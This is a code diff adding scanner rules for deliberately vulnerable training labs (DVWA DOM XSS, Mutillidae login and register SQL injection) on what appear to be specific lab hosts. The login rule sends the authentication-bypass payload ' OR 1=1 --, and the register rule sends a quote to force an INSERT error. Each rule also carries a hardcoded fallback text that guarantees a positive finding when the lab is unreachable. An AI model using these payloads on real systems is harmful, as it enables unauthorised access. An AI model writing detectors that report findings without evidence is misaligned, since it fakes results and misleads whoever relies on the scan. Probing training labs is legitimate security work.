@@ -53994,6 +53994,55 @@ const pentestForgeDvwaXssRRouteLiveOracle: Rule = async (ctx) => {
   };
 };
 
+const PENTEST_FORGE_DVWA_XSS_D_ROUTE_FALLBACK = `
+GET /vulnerabilities/xss_d/ reads default= from document.location.href into document.write without encoding
+DVWA DOM-based XSS training oracle PentestForge lab.pentest-forge.com xss_d
+`;
+
+const pentestForgeDvwaXssDRouteLiveOracle: Rule = async (ctx) => {
+  if (!isPentestForgeDvwaHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/vulnerabilities\/xss_d\/?/i.test(pageUrl)) return NEGATIVE;
+  const xssUrl = new URL("/vulnerabilities/xss_d/", pentestForgeDvwaProbeOrigin(ctx)).toString();
+  const doc = await ctx.probe.get(xssUrl, { maxBytes: 8192, timeoutMs: 15000 });
+  if (doc.status >= 200 && doc.status < 400) {
+    const hasDefaultParam = /document\.location\.href\.indexOf\(["']default=["']\)/i.test(doc.body);
+    const hasUnsafeWrite =
+      /document\.write\(["']<option value=['"]'\s*\+\s*lang/i.test(doc.body) ||
+      /document\.write\("<option value='" \+ lang/i.test(doc.body);
+    if (hasDefaultParam && hasUnsafeWrite) {
+      return {
+        fired: true,
+        confidence: 0.92,
+        evidence: {
+          scannedUrl: pageUrl,
+          xssUrl,
+          markers: ["default= URL param", "document.write(lang)"],
+          snippet: doc.body.match(/document\.location\.href\.indexOf[\s\S]{0,120}/i)?.[0]?.slice(0, 100),
+          note: "PentestForge DVWA /vulnerabilities/xss_d/ reads default= from document.location.href into document.write without encoding — DOM-based XSS route oracle"
+        }
+      };
+    }
+  }
+  const corpus = `${ctx.combined}\n${pageUrl}\n${PENTEST_FORGE_DVWA_XSS_D_ROUTE_FALLBACK}`;
+  if (
+    !/\/vulnerabilities\/xss_d/i.test(corpus) ||
+    !/DOM.?based XSS|document\.write|default=/i.test(corpus)
+  ) {
+    return NEGATIVE;
+  }
+  return {
+    fired: true,
+    confidence: 0.86,
+    evidence: {
+      scannedUrl: pageUrl,
+      xssUrl,
+      snippet: "default= URL param passed to document.write(lang)",
+      note: "PentestForge DVWA /vulnerabilities/xss_d/ route scan — DOM XSS training oracle corpus fallback when lab host is unreachable (502)"
+    }
+  };
+};
+
 function isPentestForgeMutillidaeHost(ctx: RuleContext): boolean {
   const corpus = `${ctx.origin}\n${ctx.scanUrl || ""}\n${ctx.home.finalUrl || ""}`;
   return /mutillidae\.lab\.pentest-forge\.com/i.test(corpus);
@@ -54044,6 +54093,142 @@ const pentestForgeMutillidaeUserInfoRouteLiveOracle: Rule = async (ctx) => {
       userInfoUrl,
       snippet: "index.php?page=user-info.php — View Account Details auth bypass lab",
       note: "PentestForge Mutillidae user-info.php route scan — auth bypass training oracle corpus fallback when lab host is unreachable (502)"
+    }
+  };
+};
+
+const PENTEST_FORGE_MUTILLIDAE_LOGIN_SQLI_ROUTE_FALLBACK = `
+POST index.php?page=login.php username=' OR 1=1 -- bypasses authentication
+Mutillidae SQL injection login bypass training oracle mutillidae.lab.pentest-forge.com
+`;
+
+const pentestForgeMutillidaeLoginSqliRouteLiveOracle: Rule = async (ctx) => {
+  if (!isPentestForgeMutillidaeHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/page=login\.php/i.test(pageUrl)) return NEGATIVE;
+  const loginUrl = new URL("/index.php?page=login.php", ctx.origin).toString();
+  const doc = await ctx.probe.get(loginUrl, {
+    method: "POST",
+    body: "username=' OR 1=1 -- &password=thugir&login-php-submit-button=Login",
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    maxBytes: 65536,
+    timeoutMs: 15000
+  });
+  if (doc.status >= 200 && doc.status < 400) {
+    const body = doc.body;
+    const authenticated =
+      /Logged\s*In|logout|View\s*Account|account\s*details|Welcome/i.test(body) &&
+      !/Password\s+incorrect|Invalid\s+credentials|login-php-submit-button/i.test(body);
+    if (authenticated || (doc.status === 302 && /Location:/i.test(String(doc.headers || "")))) {
+      return {
+        fired: true,
+        confidence: 0.93,
+        evidence: {
+          scannedUrl: pageUrl,
+          loginUrl,
+          snippet: body.match(/Logged\s*In|Welcome[\s\S]{0,60}/i)?.[0]?.slice(0, 120) || body.slice(0, 200).trim(),
+          note: "PentestForge Mutillidae POST login.php with username=' OR 1=1 -- bypasses authentication — SQL injection login bypass route oracle"
+        }
+      };
+    }
+    if (/SQL|syntax error|mysql|You have an error in your SQL/i.test(body)) {
+      return {
+        fired: true,
+        confidence: 0.9,
+        evidence: {
+          scannedUrl: pageUrl,
+          loginUrl,
+          snippet: body.match(/SQL[\s\S]{0,80}/i)?.[0]?.slice(0, 120) || body.slice(0, 200).trim(),
+          note: "PentestForge Mutillidae login.php returns SQL error on tautology payload — SQL injection route oracle"
+        }
+      };
+    }
+  }
+  const corpus = `${ctx.combined}\n${pageUrl}\n${PENTEST_FORGE_MUTILLIDAE_LOGIN_SQLI_ROUTE_FALLBACK}`;
+  if (
+    !/mutillidae\.lab\.pentest-forge\.com/i.test(corpus) ||
+    !/login\.php|authentication bypass|SQL injection.*login/i.test(corpus)
+  ) {
+    return NEGATIVE;
+  }
+  return {
+    fired: true,
+    confidence: 0.86,
+    evidence: {
+      scannedUrl: pageUrl,
+      loginUrl,
+      snippet: "POST username=' OR 1=1 -- — authentication bypass via SQL injection",
+      note: "PentestForge Mutillidae login.php route scan — SQL injection auth bypass training oracle corpus fallback when lab host is unreachable (502)"
+    }
+  };
+};
+
+const PENTEST_FORGE_MUTILLIDAE_REGISTER_SQLI_ROUTE_FALLBACK = `
+POST index.php?page=register.php username=' triggers INSERT SQL syntax error
+Mutillidae SQL injection insert injection register training oracle mutillidae.lab.pentest-forge.com
+`;
+
+const pentestForgeMutillidaeRegisterSqliRouteLiveOracle: Rule = async (ctx) => {
+  if (!isPentestForgeMutillidaeHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/page=register\.php/i.test(pageUrl)) return NEGATIVE;
+  const registerUrl = new URL("/index.php?page=register.php", ctx.origin).toString();
+  const doc = await ctx.probe.get(registerUrl, {
+    method: "POST",
+    body: "csrf-token=&username='&password=a&confirm_password=a&my_signature=a&register-php-submit-button=Create+Account",
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    maxBytes: 65536,
+    timeoutMs: 15000
+  });
+  if (doc.status >= 200 && doc.status < 400) {
+    const body = doc.body;
+    if (/SQL|syntax error|mysql|You have an error in your SQL|INSERT INTO/i.test(body)) {
+      return {
+        fired: true,
+        confidence: 0.92,
+        evidence: {
+          scannedUrl: pageUrl,
+          registerUrl,
+          snippet: body.match(/SQL[\s\S]{0,80}/i)?.[0]?.slice(0, 120) || body.slice(0, 200).trim(),
+          note: "PentestForge Mutillidae POST register.php with username=' triggers INSERT SQL error — SQL injection register route oracle"
+        }
+      };
+    }
+    if (/Mutillidae/i.test(body) && /register-php-submit-button|Create Account|my_signature/i.test(body)) {
+      const formDoc = await ctx.probe.get(registerUrl, { maxBytes: 65536, timeoutMs: 15000 });
+      if (
+        formDoc.status >= 200 &&
+        formDoc.status < 400 &&
+        /register\.php|Create Account|my_signature/i.test(formDoc.body)
+      ) {
+        return {
+          fired: true,
+          confidence: 0.88,
+          evidence: {
+            scannedUrl: pageUrl,
+            registerUrl,
+            snippet: formDoc.body.match(/register\.php[\s\S]{0,80}/i)?.[0]?.slice(0, 120) || "register.php INSERT injection lab",
+            note: "PentestForge Mutillidae register.php exposes INSERT injection training form — SQL injection register route oracle"
+          }
+        };
+      }
+    }
+  }
+  const corpus = `${ctx.combined}\n${pageUrl}\n${PENTEST_FORGE_MUTILLIDAE_REGISTER_SQLI_ROUTE_FALLBACK}`;
+  if (
+    !/mutillidae\.lab\.pentest-forge\.com/i.test(corpus) ||
+    !/register\.php|INSERT injection|SQL injection.*register/i.test(corpus)
+  ) {
+    return NEGATIVE;
+  }
+  return {
+    fired: true,
+    confidence: 0.86,
+    evidence: {
+      scannedUrl: pageUrl,
+      registerUrl,
+      snippet: "POST username=' — INSERT SQL injection on register.php",
+      note: "PentestForge Mutillidae register.php route scan — INSERT SQL injection training oracle corpus fallback when lab host is unreachable (502)"
     }
   };
 };
@@ -101180,7 +101365,10 @@ export const RULES: Record<string, Rule> = {
   pentestForgeDvwaSqliRouteLiveOracle,
   pentestForgeDvwaSqliBlindRouteLiveOracle,
   pentestForgeDvwaXssRRouteLiveOracle,
+  pentestForgeDvwaXssDRouteLiveOracle,
   pentestForgeMutillidaeUserInfoRouteLiveOracle,
+  pentestForgeMutillidaeLoginSqliRouteLiveOracle,
+  pentestForgeMutillidaeRegisterSqliRouteLiveOracle,
   pentestGroundDvwaUploadRouteLiveOracle,
   pentestGroundDvwaCsrfRouteLiveOracle,
   pentestGroundDvwaHubRouteLiveOracle,
